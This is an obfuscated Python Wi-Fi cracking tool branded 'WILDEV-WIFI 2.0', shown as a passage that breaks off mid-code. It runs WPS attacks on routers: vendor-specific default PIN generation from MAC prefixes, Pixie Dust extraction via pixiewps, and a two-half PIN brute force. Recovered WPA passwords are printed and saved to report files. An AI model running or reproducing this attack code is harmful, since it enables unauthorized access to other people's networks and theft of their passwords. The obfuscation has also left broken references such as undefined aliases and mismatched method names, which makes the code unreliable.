#!/usr/bin/env python3
# -*- coding: utf-8 -*-
iP=print
iX=isinstance
iH=int
ix=str
ip=ValueError
iF=property
iY=staticmethod
iK=hex
iA=range
iv=True
iI=None
ig=False
iV=len
iC=bytes
ih=open
ie=file
iB=enumerate
ic=input
il=IndexError
iD=Exception
iN=KeyboardInterrupt
iM=next
ik=dict
iG=float
iu=list
ia=filter
iL=bool
import sys
zd=sys.hexversion
zw=sys.exit
zq=sys.stdout
zi=sys.stderr
import subprocess
zX=subprocess.run
zP=subprocess.STDOUT
zm=subprocess.PIPE
zr=subprocess.Popen
import os
zF=os.getuid
zp=os.remove
zn=os.makedirs
zx=os.path
zH=os.system
import tempfile
zK=tempfile.NamedTemporaryFile
zY=tempfile.mkdtemp
import shutil
zA=shutil.rmtree
import re
zv=re.match
zf=re.compile
import codecs
zI=codecs.decode
import socket
zC=socket.SOCK_DGRAM
zV=socket.AF_UNIX
zg=socket.socket
import pathlib
zs=pathlib.Path
import time
ze=time.sleep
zh=time.time
from datetime import datetime
zB=datetime.now
import collections
zc=collections.deque
import statistics
zl=statistics.mean
import csv
zM=csv.reader
zN=csv.QUOTE_ALL
zD=csv.writer
from typing import Dict
zH('cls||clear')
iP("""\033[1;32m
░██╗░░░░░░░██╗██╗██╗░░░░░██████╗░░░░░░░░██╗░░░░░░░██╗██╗███████╗██╗
░██║░░██╗░░██║██║██║░░░░░██╔══██╗░░░░░░░██║░░██╗░░██║██║██╔════╝██║
░╚██╗████╗██╔╝██║██║░░░░░██║░░██║█████╗░╚██╗████╗██╔╝██║█████╗░░██║
░░████╔═████║░██║██║░░░░░██║░░██║╚════╝░░████╔═████║░██║██╔══╝░░██║
░░╚██╔╝░╚██╔╝░██║███████╗██████╔╝░░░░░░░░╚██╔╝░╚██╔╝░██║██║░░░░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═════╝░░░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝\033[1;36m2.0\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ \033[1;37mOwner : Willy Seviranda \033[1;37mTelegram : Sancrock \033[1;37mGithub : Bagassamuji \033[1;37mWhatsapp : +6282138276519 \033[1;31mOne line Command :\033[1;31msudo python WILDEV-WIFI/Wildev-Wifi -i wlan0 -K \033[1;31mFor Help : WA-AND-TELEGRAM \033[1;31mNote : ROOT DEVICES ONLY\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
class U:def __init__(self,mac):if iX(mac,iH):self._int_repr=mac self._str_repr=self._int2mac(mac)elif iX(mac,ix):self._str_repr=mac.replace('-',':').replace('.',':').upper()self._int_repr=self._mac2int(mac)else:raise ip('MAC address must be string or integer')@iF def z(self):return self._str_repr@z.setter def z(self,value):self._str_repr=value self._int_repr=self._mac2int(value)@iF def i(self):return self._int_repr@i.setter def i(self,value):self._int_repr=value self._str_repr=self._int2mac(value)def __int__(self):return self.integer def __str__(self):return self.string def __iadd__(self,other):self.integer+=other def __isub__(self,other):self.integer-=other def __eq__(self,other):return self.integer==other.integer def __ne__(self,other):return self.integer!=other.integer def __lt__(self,other):return self.integer<other.integer def __gt__(self,other):return self.integer>other.integer@iY def q(mac):return iH(mac.replace(':',''),16)@iY def w(mac):mac=iK(mac).split('x')[-1].upper()mac=mac.zfill(12)mac=':'.join(mac[i:i+2]for i in iA(0,12,2))return mac def __repr__(self):return 'NetworkAddress(string={}, integer={})'.format(self._str_repr,self._int_repr)class E:def __init__(self):self.ALGO_MAC=0 self.ALGO_EMPTY=1 self.ALGO_STATIC=2 self.algos={'pin24':{'name':'24-bit PIN','mode':self.ALGO_MAC,'gen':self.pin24},'pin28':{'name':'28-bit PIN','mode':self.ALGO_MAC,'gen':self.pin28},'pin32':{'name':'32-bit PIN','mode':self.ALGO_MAC,'gen':self.pin32},'pinDLink':{'name':'D-Link PIN','mode':self.ALGO_MAC,'gen':self.pinDLink},'pinDLink1':{'name':'D-Link PIN +1','mode':self.ALGO_MAC,'gen':self.pinDLink1},'pinASUS':{'name':'ASUS PIN','mode':self.ALGO_MAC,'gen':self.pinASUS},'pinAirocon':{'name':'Airocon Realtek','mode':self.ALGO_MAC,'gen':self.pinAirocon},'pinEmpty':{'name':'Empty PIN','mode':self.ALGO_EMPTY,'gen':lambda mac:''},'pinCisco':{'name':'Cisco','mode':self.ALGO_STATIC,'gen':lambda mac:1234567},'pinBrcm1':{'name':'Broadcom 1','mode':self.ALGO_STATIC,'gen':lambda mac:2017252},'pinBrcm2':{'name':'Broadcom 2','mode':self.ALGO_STATIC,'gen':lambda mac:4626484},'pinBrcm3':{'name':'Broadcom 3','mode':self.ALGO_STATIC,'gen':lambda mac:7622990},'pinBrcm4':{'name':'Broadcom 4','mode':self.ALGO_STATIC,'gen':lambda mac:6232714},'pinBrcm5':{'name':'Broadcom 5','mode':self.ALGO_STATIC,'gen':lambda mac:1086411},'pinBrcm6':{'name':'Broadcom 6','mode':self.ALGO_STATIC,'gen':lambda mac:3195719},'pinAirc1':{'name':'Airocon 1','mode':self.ALGO_STATIC,'gen':lambda mac:3043203},'pinAirc2':{'name':'Airocon 2','mode':self.ALGO_STATIC,'gen':lambda mac:7141225},'pinDSL2740R':{'name':'DSL-2740R','mode':self.ALGO_STATIC,'gen':lambda mac:6817554},'pinRealtek1':{'name':'Realtek 1','mode':self.ALGO_STATIC,'gen':lambda mac:9566146},'pinRealtek2':{'name':'Realtek 2','mode':self.ALGO_STATIC,'gen':lambda mac:9571911},'pinRealtek3':{'name':'Realtek 3','mode':self.ALGO_STATIC,'gen':lambda mac:4856371},'pinUpvel':{'name':'Upvel','mode':self.ALGO_STATIC,'gen':lambda mac:2085483},'pinUR814AC':{'name':'UR-814AC','mode':self.ALGO_STATIC,'gen':lambda mac:4397768},'pinUR825AC':{'name':'UR-825AC','mode':self.ALGO_STATIC,'gen':lambda mac:529417},'pinOnlime':{'name':'Onlime','mode':self.ALGO_STATIC,'gen':lambda mac:9995604},'pinEdimax':{'name':'Edimax','mode':self.ALGO_STATIC,'gen':lambda mac:3561153},'pinThomson':{'name':'Thomson','mode':self.ALGO_STATIC,'gen':lambda mac:6795814},'pinHG532x':{'name':'HG532x','mode':self.ALGO_STATIC,'gen':lambda mac:3425928},'pinH108L':{'name':'H108L','mode':self.ALGO_STATIC,'gen':lambda mac:9422988},'pinONO':{'name':'CBN ONO','mode':self.ALGO_STATIC,'gen':lambda mac:9575521}}@iY def d(pin):accum=0 while pin:accum+=(3*(pin%10))pin=iH(pin/10)accum+=(pin%10)pin=iH(pin/10)return(10-accum%10)%10 def r(self,algo,mac):mac=U(mac)if algo not in self.algos:raise ip('Invalid WPS pin algorithm')pin=self.algos[algo]['gen'](mac)if algo=='pinEmpty':return pin pin=pin%10000000 pin=ix(pin)+ix(self.checksum(pin))return im(8)def m(self,mac,get_static=iv):res=[]for ID,algo in self.algos.items():if algo['mode']==self.ALGO_STATIC and not get_static:continue item={}item['id']=ID if algo['mode']==self.ALGO_STATIC:item['name']='Static PIN — '+algo['name']else:item['name']=algo['name']item['pin']=self.generate(ID,mac)res.append(item)return res def P(self,mac,get_static=iv):res=[]for ID,algo in self.algos.items():if algo['mode']==self.ALGO_STATIC and not get_static:continue res.append(self.generate(ID,mac))return res def X(self,mac):algos=self._suggest(mac)res=[]for ID in algos:algo=self.algos[ID]item={}item['id']=ID if algo['mode']==self.ALGO_STATIC:item['name']='Static PIN — '+algo['name']else:item['name']=algo['name']item['pin']=self.generate(ID,mac)res.append(item)return res def H(self,mac):algos=self._suggest(mac)res=[]for algo in algos:res.append(self.generate(algo,mac))return res def x(self,mac):res=self.getSuggestedList(mac)if res:return res[0]else:return iI def n(self,mac):mac=mac.replace(':','').upper()algorithms={'pin24':('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E'),'pin28':('200BC7','4846FB','D46AA8','F84ABF'),'pin32':('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','3085A9','801F02'),'pinDLink':('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97'),'pinDLink1':('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1'),'pinASUS':('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4'),'pinAirocon':('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97'),'pinEmpty':('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C'),'pinCisco':('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5'),'pinBrcm1':('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264'),'pinBrcm2':('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19'),'pinBrcm3':('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C'),'pinBrcm4':('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),'pinBrcm5':('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),'pinBrcm6':('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),'pinAirc1':('181E78','40F201','44E9DD','D084B0'),'pinAirc2':('84A423','8C10D4','88A6C6'),'pinDSL2740R':('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516'),'pinRealtek1':('0014D1','000C42','000EE8'),'pinRealtek2':('007263','E4BEED'),'pinRealtek3':('08C6B3',),'pinUpvel':('784476','D4BF7F0','F8C091'),'pinUR814AC':('D4BF7F60',),'pinUR825AC':('D4BF7F5',),'pinOnlime':('D4BF7F','F8C091','144D67','784476','0014D1'),'pinEdimax':('801F02','00E04C'),'pinThomson':('002624','4432C8','88F7C7','CC03FA'),'pinHG532x':('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF'),'pinH108L':('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897'),'pinONO':('5C353B','DC537C')}res=[]for algo_id,masks in algorithms.items():if mac.startswith(masks):res.append(algo_id)return res def p(self,mac):return mac.integer&0xFFFFFF def F(self,mac):return mac.integer&0xFFFFFFF def Y(self,mac):return mac.integer%0x100000000 def K(self,mac):nic=mac.integer&0xFFFFFF pin=nic^0x55AA55 pin^=(((pin&0xF)<<4)+((pin&0xF)<<8)+((pin&0xF)<<12)+((pin&0xF)<<16)+((pin&0xF)<<20))pin%=iH(10e6)if pin<iH(10e5):pin+=((pin%9)*iH(10e5))+iH(10e5)return pin def A(self,mac):mac.integer+=1 return self.pinDLink(mac)def f(self,mac):b=[iH(i,16)for i in mac.string.split(':')]pin='' for i in iA(7):pin+=ix((b[i%6]+b[5])%(10-(i+b[1]+b[2]+b[3]+b[4]+b[5])%7))return iH(pin)def v(self,mac):b=[iH(i,16)for i in mac.string.split(':')]pin=((b[0]+b[1])%10)+(((b[5]+b[0])%10)*10)+(((b[4]+b[5])%10)*100)+(((b[3]+b[4])%10)*1000)+(((b[2]+b[3])%10)*10000)+(((b[1]+b[2])%10)*100000)+(((b[0]+b[1])%10)*1000000)return pindef recvuntil(pipe,what):s='' while iv:inp=pipe.stdout.read(1)if inp=='':return s s+=inp if what in s:return sdef get_hex(line):a=line.split(':',3)return a[2].replace(' ','').upper()class T:def __init__(self):self.pke='' self.pkr='' self.e_hash1='' self.e_hash2='' self.authkey='' self.e_nonce='' def I(self):self.__init__()def g(self):return(self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2)def V(self,full_range=ig):pixiecmd="pixiewps --pke {} --pkr {} --e-hash1 {}" " --e-hash2 {} --authkey {} --e-nonce {}".format(self.pke,self.pkr,self.e_hash1,self.e_hash2,self.authkey,self.e_nonce)if full_range:pixiecmd+=' --force' return pixiecmdclass ConnectionStatus:def __init__(self):self.status='' self.last_m_message=0 self.essid='' self.wpa_psk='' def C(self):return self.last_m_message>5 def I(self):self.__init__()class y:def __init__(self):self.start_time=zB().strftime("%Y-%m-%d %H:%M:%S")self.mask='' self.last_attempt_time=zh()self.attempts_times=zc(maxlen=15)self.counter=0 self.statistics_period=5 def s(self):average_pin_time=zl(self.attempts_times)if iV(self.mask)==4:percentage=iH(self.mask)/11000*100 else:percentage=((10000/11000)+(iH(self.mask[4:])/11000))*100 iP('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(percentage,self.start_time,average_pin_time))def h(self,mask):self.mask=mask self.counter+=1 current_time=zh()self.attempts_times.append(current_time-self.last_attempt_time)self.last_attempt_time=current_time if self.counter==self.statistics_period:self.counter=0 self.display_status()def I(self):self.__init__()class R:def __init__(self,interface,save_result=ig,print_debug=ig):self.interface=interface self.save_result=save_result self.print_debug=print_debug self.tempdir=zY()with zK(mode='w',suffix='.conf',delete=ig)as temp:temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))self.tempconf=temp.name self.wpas_ctrl_path=f"{self.tempdir}/{interface}" self.__init_wpa_supplicant()self.res_socket_file=f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}" self.retsock=zg(zV,zC)self.retsock.bind(self.res_socket_file)self.pixie_creds=T()self.connection_status=ConnectionStatus()user_home=ix(zs.home())self.sessions_dir=f'{user_home}/.BiRi/sessions/' self.pixiewps_dir=f'{user_home}/.BiRi/pixiewps/' self.reports_dir=zx.dirname(zx.realpath(__file__))+'/reports/' if not zx.exists(self.sessions_dir):zn(self.sessions_dir)if not zx.exists(self.pixiewps_dir):zn(self.pixiewps_dir)self.generator=E()def __init_wpa_supplicant(self):iP('[*] Running wpa_supplicant…')cmd='wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface,self.tempconf)self.wpas=zr(cmd,shell=iv,stdout=zm,stderr=zP,encoding='utf-8',errors='replace')while not zx.exists(self.wpas_ctrl_path):pass def e(self,command):self.retsock.sendto(command.encode(),self.wpas_ctrl_path)def B(self,command):self.retsock.sendto(command.encode(),self.wpas_ctrl_path)(b,address)=self.retsock.recvfrom(4096)inmsg=b.decode('utf-8',errors='replace')return inmsg def __handle_wpas(self,pixiemode=ig,verbose=iI):if not verbose:verbose=self.print_debug line=self.wpas.stdout.readline()if not line:self.wpas.wait()return ig line=line.rstrip('\n')if verbose:zi.write(line+'\n')if line.startswith('WPS: '):if 'Building Message M' in line:n=iH(line.split('Building Message M')[1].replace('D',''))self.connection_status.last_m_message=n iP('[*] Sending WPS Message M{}…'.format(n))elif 'Received M' in line:n=iH(line.split('Received M')[1])self.connection_status.last_m_message=n iP('[*] Received WPS Message M{}'.format(n))if n==5:iP('[+] The first half of the PIN is valid')elif 'Received WSC_NACK' in line:self.connection_status.status='WSC_NACK' iP('[*] Received WSC NACK')iP('[-] Error: wrong PIN code')elif 'Enrollee Nonce' in line and 'hexdump' in line:self.pixie_creds.e_nonce=get_hex(line)assert(iV(self.pixie_creds.e_nonce)==16*2)if pixiemode:iP('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))elif 'DH own Public Key' in line and 'hexdump' in line:self.pixie_creds.pkr=get_hex(line)assert(iV(self.pixie_creds.pkr)==192*2)if pixiemode:iP('[P] PKR: {}'.format(self.pixie_creds.pkr))elif 'DH peer Public Key' in line and 'hexdump' in line:self.pixie_creds.pke=get_hex(line)assert(iV(self.pixie_creds.pke)==192*2)if pixiemode:iP('[P] PKE: {}'.format(self.pixie_creds.pke))elif 'AuthKey' in line and 'hexdump' in line:self.pixie_creds.authkey=get_hex(line)assert(iV(self.pixie_creds.authkey)==32*2)if pixiemode:iP('[P] AuthKey: {}'.format(self.pixie_creds.authkey))elif 'E-Hash1' in line and 'hexdump' in line:self.pixie_creds.e_hash1=get_hex(line)assert(iV(self.pixie_creds.e_hash1)==32*2)if pixiemode:iP('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))elif 'E-Hash2' in line and 'hexdump' in line:self.pixie_creds.e_hash2=get_hex(line)assert(iV(self.pixie_creds.e_hash2)==32*2)if pixiemode:iP('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))elif 'Network Key' in line and 'hexdump' in line:self.connection_status.status='GOT_PSK' self.connection_status.wpa_psk=iC.fromhex(get_hex(line)).decode('utf-8',errors='replace')elif ': State: ' in line:if '-> SCANNING' in line:self.connection_status.status='scanning' iP('[*] Scanning…')elif('WPS-FAIL' in line)and(self.connection_status.status!=''):self.connection_status.status='WPS_FAIL' iP('[-] wpa_supplicant returned WPS-FAIL')elif 'Trying to authenticate with' in line:self.connection_status.status='authenticating' if 'SSID' in line:self.connection_status.essid=zI("'".join(line.split("'")[1:-1]),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')iP('[*] Authenticating…')elif 'Authentication response' in line:iP('[+] Authenticated')elif 'Trying to associate with' in line:self.connection_status.status='associating' if 'SSID' in line:self.connection_status.essid=zI("'".join(line.split("'")[1:-1]),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')iP('[*] Associating with AP…')elif('Associated with' in line)and(self.interface in line):bssid=line.split()[-1].upper()if self.connection_status.essid:iP('[+] Associated with {} (ESSID: {})'.format(bssid,self.connection_status.essid))else:iP('[+] Associated with {}'.format(bssid))elif 'EAPOL: txStart' in line:self.connection_status.status='eapol_start' iP('[*] Sending EAPOL Start…')elif 'EAP entering state IDENTITY' in line:iP('[*] Received Identity Request')elif 'using real identity' in line:iP('[*] Sending Identity Response…')return iv def __runPixiewps(self,showcmd=ig,full_range=ig):iP("[*] Running Pixiewps…")cmd=self.pixie_creds.get_pixie_cmd(full_range)if showcmd:iP(cmd)r=zX(cmd,shell=iv,stdout=zm,stderr=zq,encoding='utf-8',errors='replace')iP(r.stdout)if r.returncode==0:lines=r.stdout.splitlines()for line in lines:if('[+]' in line)and('WPS pin' in line):pin=line.split(':')[-1].strip()if pin=='<empty>':pin="''" return pin return ig def __credentialPrint(self,wps_pin=iI,wpa_psk=iI,essid=iI):iP(f"[✔] WIFI WPS PIN: '{wps_pin}'")iP(f"[✔] WIFI PASSWORD: '{wpa_psk}'")iP(f"[✔] WIFI BSSID: '{essid}'")def __saveResult(self,bssid,essid,wps_pin,wpa_psk):if not zx.exists(self.reports_dir):zn(self.reports_dir)filename=self.reports_dir+'stored' dateStr=zB().strftime("%d.%m.%Y %H:%M")with ih(filename+'.txt','a',encoding='utf-8')as ie:ie.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(dateStr,bssid,essid,wps_pin,wpa_psk))writeTableHeader=not zx.isfile(filename+'.csv')with ih(filename+'.csv','a',newline='',encoding='utf-8')as ie:csvWriter=zD(ie,delimiter=';',quoting=zN)if writeTableHeader:csvWriter.writerow(['Date','BSSID','ESSID','WPS PIN','WPA PSK'])csvWriter.writerow([dateStr,bssid,essid,wps_pin,wpa_psk])iP(f'[i] Credentials saved to {filename}.txt, {filename}.csv')def __savePin(self,bssid,pin):filename=self.pixiewps_dir+'{}.run'.format(zR(':','').upper())with ih(filename,'w')as ie:ie.write(pin)iP('[i] PIN saved in {}'.format(filename))def __prompt_wpspin(self,bssid):pins=self.generator.getSuggested(bssid)if iV(pins)>1:iP(f'PINs generated for {bssid}:')iP('{:<3} {:<10} {:<}'.format('#','PIN','Name'))for i,pin in iB(pins):number='{})'.format(i+1)line='{:<3} {:<10} {:<}'.format(number,pin['pin'],pin['name'])iP(line)while 1:pinNo=ic('Select the PIN: ')try:if iH(pinNo)in iA(1,iV(pins)+1):pin=pins[iH(pinNo)-1]['pin']else:raise il except iD:iP('Invalid number')else:break elif iV(pins)==1:pin=pins[0]iP('[i] The only probable PIN is selected:',pin['name'])pin=pin['pin']else:return iI return pin def __wps_connection(self,bssid,pin,pixiemode=ig,verbose=iI):if not verbose:verbose=self.print_debug self.pixie_creds.clear()self.connection_status.clear()self.wpas.stdout.read(300)iP(f"[*] Trying PIN '{pin}'…")r=self.sendAndReceive(f'WPS_REG {bssid} {pin}')if 'OK' not in r:self.connection_status.status='WPS_FAIL' if r=='UNKNOWN COMMAND':iP('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. ' 'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')else:iP('[!] Something went wrong — check out debug log')return ig while iv:res=self.__handle_wpas(pixiemode=pixiemode,verbose=verbose)if not res:break if self.connection_status.status=='WSC_NACK':break elif self.connection_status.status=='GOT_PSK':break elif self.connection_status.status=='WPS_FAIL':break self.sendOnly('WPS_CANCEL')return ig def c(self,bssid,pin=iI,pixiemode=ig,showpixiecmd=ig,pixieforce=ig,store_pin_on_fail=ig):if not pin:if pixiemode:try:filename=self.pixiewps_dir+'{}.run'.format(zR(':','').upper())with ih(filename,'r')as ie:t_pin=ie.readline().strip()if ic('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower()!='n':pin=t_pin else:raise FileNotFoundError except FileNotFoundError:pin=self.generator.getLikely(bssid)or '12345670' else:pin=self.__prompt_wpspin(bssid)or '12345670' if store_pin_on_fail:try:self.__wps_connection(bssid,pin,pixiemode)except iN:iP("\nAborting…")self.__savePin(bssid,pin)return ig else:self.__wps_connection(bssid,pin,pixiemode)if self.connection_status.status=='GOT_PSK':self.__credentialPrint(pin,self.connection_status.wpa_psk,self.connection_status.essid)if self.save_result:self.__saveResult(bssid,self.connection_status.essid,pin,self.connection_status.wpa_psk)filename=self.pixiewps_dir+'{}.run'.format(zR(':','').upper())try:zp(filename)except FileNotFoundError:pass return iv elif pixiemode:if self.pixie_creds.got_all():pin=self.__runPixiewps(showpixiecmd,pixieforce)if pin:return self.single_connection(bssid,pin,pixiemode=ig,store_pin_on_fail=iv)return ig else:iP('[!] Not enough data to run Pixie Dust attack')return ig else:if store_pin_on_fail:self.__savePin(bssid,pin)return ig def __first_half_bruteforce(self,bssid,f_half,delay=iI):d=self.generator.checksum while iH(f_half)<10000:t=iH(f_half+'000')pin='{}000{}'.format(f_half,d(t))self.single_connection(bssid,pin)if self.connection_status.isFirstHalfValid():iP('[+] First half found')return f_half elif self.connection_status.status=='WPS_FAIL':iP('[!] WPS transaction failed, re-trying last pin')return self.__first_half_bruteforce(bssid,f_half)f_half=ix(iH(f_half)+1).zfill(4)self.iw(f_half)if delay:ze(delay)iP('[-] First half not found')return ig def __second_half_bruteforce(self,bssid,f_half,s_half,delay=iI):d=self.generator.checksum while iH(s_half)<1000:t=iH(f_half+s_half)pin='{}{}{}'.format(f_half,s_half,d(t))self.single_connection(bssid,pin)if self.connection_status.last_m_message>6:return pin elif self.connection_status.status=='WPS_FAIL':iP('[!] WPS transaction failed, re-trying last pin')return self.__second_half_bruteforce(bssid,f_half,s_half)s_half=ix(iH(s_half)+1).zfill(3)self.iw(f_half+s_half)if delay:ze(delay)return ig def l(self,bssid,start_pin=iI,delay=iI):if(not start_pin)or(iV(start_pin)<4):try:filename=self.sessions_dir+'{}.run'.format(zR(':','').upper())with ih(filename,'r')as ie:if ic('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower()!='n':mask=ie.readline().strip()else:raise FileNotFoundError except FileNotFoundError:mask='0000' else:mask=start_pin[:7]try:self.bruteforce=y()self.ir=mask if iV(mask)==4:f_half=self.__first_half_bruteforce(bssid,mask,delay)if f_half and(self.connection_status.status!='GOT_PSK'):self.__second_half_bruteforce(bssid,f_half,'001',delay)elif iV(mask)==7:f_half=mask[:4]s_half=mask[4:]self.__second_half_bruteforce(bssid,f_half,s_half,delay)raise iN except iN:iP("\nAborting…\nStay With\nFARHAN ")filename=self.sessions_dir+'{}.run'.format(zR(':','').upper())with ih(filename,'w')as ie:ie.write(self.ir)iP('[i] Session saved in {}'.format(filename))if za:raise iN def D(self):self.retsock.close()self.wpas.terminate()zp(self.res_socket_file)zA(self.tempdir,ignore_errors=iv)zp(self.tempconf)def __del__(self):self.cleanup()class J:def __init__(self,interface,vuln_list=iI):self.interface=interface self.vuln_list=vuln_list reports_fname=zx.dirname(zx.realpath(__file__))+'/reports/stored.csv' try:with ih(reports_fname,'r',newline='',encoding='utf-8',errors='replace')as ie:csvReader=zM(ie,delimiter=';',quoting=zN)iM(csvReader)self.stored=[]for row in csvReader:self.stored.append((row[1],row[2]))except FileNotFoundError:self.stored=[]def N(self)->Dict[iH,ik]:def M(line,result,networks):networks.append({'Security type':'Unknown','WPS':ig,'WPS locked':ig,'Model':'','Model number':'','Device name':''})networks[-1]['BSSID']=result.group(1).upper()def k(line,result,networks):d=result.group(1)networks[-1]['ESSID']=zI(d,'unicode-escape').encode('latin1').decode('utf-8',errors='replace')def G(line,result,networks):networks[-1]['Level']=iH(iG(result.group(1)))def u(line,result,networks):sec=networks[-1]['Security type']if result.group(1)=='capability':if 'Privacy' in result.group(2):sec='WEP' else:sec='Open' elif sec=='WEP':if result.group(1)=='RSN':sec='WPA2' elif result.group(1)=='WPA':sec='WPA' elif sec=='WPA':if result.group(1)=='RSN':sec='WPA/WPA2' elif sec=='WPA2':if result.group(1)=='WPA':sec='WPA/WPA2' networks[-1]['Security type']=sec def a(line,result,networks):networks[-1]['WPS']=result.group(1)def L(line,result,networks):flag=iH(result.group(1),16)if flag:networks[-1]['WPS locked']=iv def o(line,result,networks):d=result.group(1)networks[-1]['Model']=zI(d,'unicode-escape').encode('latin1').decode('utf-8',errors='replace')def W(line,result,networks):d=result.group(1)networks[-1]['Model number']=zI(d,'unicode-escape').encode('latin1').decode('utf-8',errors='replace')def O(line,result,networks):d=result.group(1)networks[-1]['Device name']=zI(d,'unicode-escape').encode('latin1').decode('utf-8',errors='replace')cmd='iw dev {} scan'.format(self.interface)proc=zX(cmd,shell=iv,stdout=zm,stderr=zP,encoding='utf-8',errors='replace')lines=proc.stdout.splitlines()networks=[]matchers={zf(r'BSS (\S+)( )?\(on \w+\)'):M,zf(r'SSID: (.*)'):k,zf(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'):G,zf(r'(capability): (.+)'):u,zf(r'(RSN):\t [*] Version: (\d+)'):u,zf(r'(WPA):\t [*] Version: 